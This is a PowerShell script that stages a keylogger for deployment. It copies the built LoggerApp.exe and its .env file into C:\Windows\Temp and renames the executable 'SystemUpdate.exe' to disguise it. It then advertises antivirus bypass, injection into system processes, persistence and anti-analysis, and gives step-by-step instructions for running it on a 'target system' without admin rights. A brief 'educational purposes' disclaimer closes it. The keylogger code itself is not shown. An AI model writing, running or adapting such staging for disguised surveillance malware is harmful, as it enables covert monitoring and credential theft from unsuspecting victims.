# Production Test Script - Real World Scenario
Write-Host "🚀 Testing Self-Contained Keylogger..." -ForegroundColor Cyan

# Copy to a temporary location (simulating transfer to target system)
$testDir = "C:\Windows\Temp\TestApp"
$exePath = "bin\Release\net9.0-windows\win-x64\publish\LoggerApp.exe"
$envPath = "bin\Release\net9.0-windows\win-x64\publish\.env"

try {
    # Create test directory
    if (-not (Test-Path $testDir)) {
        New-Item -ItemType Directory -Path $testDir -Force | Out-Null
    }
    
    # Copy files
    Copy-Item $exePath "$testDir\SystemUpdate.exe" -Force
    Copy-Item $envPath "$testDir\.env" -Force
    
    Write-Host "✅ Files copied to: $testDir" -ForegroundColor Green
    
    # Show file info
    $file = Get-Item "$testDir\SystemUpdate.exe"
    Write-Host "📦 File Size: $([math]::Round($file.Length / 1MB, 2)) MB" -ForegroundColor Yellow
    Write-Host "📅 Created: $($file.CreationTime)" -ForegroundColor Yellow
    
    Write-Host "`n🎯 Ready for Real-World Test!" -ForegroundColor Cyan
    Write-Host "Features activated:" -ForegroundColor White
    Write-Host "  ✅ Auto AV Bypass (no admin needed)" -ForegroundColor Green
    Write-Host "  ✅ Self-injection into system processes" -ForegroundColor Green
    Write-Host "  ✅ Multiple persistence methods" -ForegroundColor Green
    Write-Host "  ✅ Advanced anti-analysis" -ForegroundColor Green
    Write-Host "  ✅ Polymorphic behavior" -ForegroundColor Green
    Write-Host "  ✅ Self-contained (no dependencies)" -ForegroundColor Green
    
    Write-Host "`n🔥 To test on target system:" -ForegroundColor Red
    Write-Host "   1. Copy SystemUpdate.exe and .env to target" -ForegroundColor White
    Write-Host "   2. Double-click SystemUpdate.exe" -ForegroundColor White
    Write-Host "   3. No admin rights needed!" -ForegroundColor White
    Write-Host "   4. Automatically bypasses AV" -ForegroundColor White
    Write-Host "   5. Installs persistence and starts logging" -ForegroundColor White
    
    Write-Host "`n⚠️  For Educational/Testing Purposes Only!" -ForegroundColor Yellow
    
} catch {
    Write-Host "❌ Error: $_" -ForegroundColor Red
}

Write-Host "`nPress any key to continue..."
Read-Host
